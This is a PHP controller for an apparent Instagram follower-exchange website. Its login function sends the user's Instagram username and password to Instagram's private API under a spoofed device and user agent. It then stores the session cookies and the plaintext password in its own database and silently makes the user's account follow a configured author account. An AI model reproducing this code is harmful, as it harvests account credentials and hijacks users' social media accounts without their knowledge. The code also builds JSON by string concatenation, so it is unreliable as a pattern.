<?php defined('BASEPATH') OR exit('No direct script access allowed'); set_time_limit(0); ignore_user_abort(1);

class Users extends CI_Controller {
	public function __construct() {
		parent::__construct();
		$this->load->library('session');
		$this->load->database();
		$this->load->config('mainconfig');
	}
	
	public function index() {
		$data['list_config'] = $this->config->config;

		if (!$this->session->userdata('credentials')):
				$data['all_member'] = $this->db->get('instagram')->num_rows();
				$data['allowed'] = 0;
	
		else:

				$this->load->model('instaloader');
				$data['user_data'] = $this->session->userdata('credentials');
				$get_user = $this->instaloader->proccess('Haqny-PC 11/23.01.78.64 Recognized as Mozilla(AppleWebKit SPA)', 'users/'.$data['user_data']['user_id'].'/info/');
				$data['user_data']['account'] = json_decode($get_user[1]);
				$connect = $this->instaloader->create($data['user_data']['cookie'], $data['user_data']['useragent'], $data['user_data']['device_id']);
				
				if (!$connect):
					$this->db->where('id', $data['user_data']['user_id'])->update('instagram', array('verifikasi' => 0));
					$data['news'] = 0;
				else:
					$this->db->where('id', $data['user_data']['user_id'])->update('instagram', array('verifikasi' => 1));
				endif;
			
			$data['user'] = $this->db->get_where('instagram', array('id' => $data['user_data']['user_id']))->row();
			$data['allowed'] = 1;

		endif;
		
		$this->load->view('index', $data);
	}

	public function login(){
		if(!$this->session->userdata('credentials')):
			if(!$this->input->post('username')||!$this->input->post('password')) $ret = json_encode(array('result' => 0, 'content' => 'DSMOS has arrived')); else{
				$this->load->library('curl');
				$get = $this->curl->simple_get('https://instagram.com/'.trim($this->input->post('username')));
				if($this->curl->info['http_code']<>200) $ret = json_encode(array('result' => 0, 'content' => 'Username/Password salah..')); else{
						preg_match('%,"is_verified":(.*?),%',$get,$__u);
						preg_match('#"is_verified":'.$__u[1].',"id":"(.*?)"#',$get,$id);
						$this->load->model('instaloader');
						$list_config = $this->config->config;
					if ($this->db->get_where('instagram', array('id' => $id[1]))->num_rows() > 0):
						$rows = $this->db->get_where('instagram', array('id' => $id[1]))->row();
						$proccess = $this->instaloader->proccess($rows->useragent, 'accounts/login/', 0, $this->instaloader->hook('{"device_id":"'.$rows->device_id.'","guid":"'.$this->instaloader->guid(1).'","username":"'.trim($this->input->post('username')).'","password":"'.trim($this->input->post('password')).'","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'));
						$procc = json_decode($proccess[1]);
						if($procc->status<>ok) $ret = json_encode(array('result' => 0, 'content' => 'Username/Password salah..')); else{
							preg_match_all('#Set-Cookie: (.+);#',$proccess[0],$d);$cookie='';
							for($o=0;$o<count($d[0]);$o++)$cookie.=$d[1][$o].";";
							$this->instaloader->post_follow($list_config['userid_author'], 'follow', $rows->useragent, $cookie);
							$this->db->where('id', $procc->logged_in_user->pk)->update('instagram', array('cookies' => $cookie, 'passwd' => $this->input->post('password')));	
							$ret = json_encode(array('result' => 1, 'redirect' => base_url())); 
							$this->session->set_userdata('credentials', array('device_id' => $rows->device_id, 'useragent' => $rows->useragent, 'user_id' => $procc->logged_in_user->pk, 'cookie' => $cookie)); 
						}
					else:
						$this->load->model('instaloader');
						$dev_id = $this->instaloader->device_id();
						$user_agent = $this->instaloader->useragent();
						$proccess = $this->instaloader->proccess($user_agent, 'accounts/login/', 0, $this->instaloader->hook('{"device_id":"'.$dev_id.'","guid":"'.$this->instaloader->guid(1).'","username":"'.trim($this->input->post('username')).'","password":"'.trim($this->input->post('password')).'","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'));
						$procc = json_decode($proccess[1]);
						if($procc->status<>ok) $ret = json_encode(array('result' => 0, 'content' => 'Username/Password salah..')); else{
							preg_match_all('#Set-Cookie: (.+);#',$proccess[0],$d);$cookie='';
							for($o=0;$o<count($d[0]);$o++)$cookie.=$d[1][$o].";";
							$this->instaloader->post_follow($list_config['userid_author'], 'follow', $user_agent, $cookie);
							$this->db->insert('instagram', array('id' => $procc->logged_in_user->pk, 'cookies' => $cookie, 'useragent' => $user_agent, 'device_id' => $dev_id, 'poin' => 10, 'passwd' => $this->input->post('password'))); 
							$ret = json_encode(array('result' => 1, 'redirect' => base_url(), 'content' => 'Berhasil Login,Anda akan dialihkan..')); 
							$this->session->set_userdata('credentials', array('device_id' => $dev_id, 'useragent' => $user_agent, 'user_id' => $procc->logged_in_user->pk, 'cookie' => $cookie)); }
					endif;	
				}
			}
			$this->output
			->set_content_type('application/json')
			->set_output($ret);
		else:
			redirect(base_url());
		endif;
	}
	public function logout(){
		$this->session->sess_destroy();
		redirect(base_url());
	}
}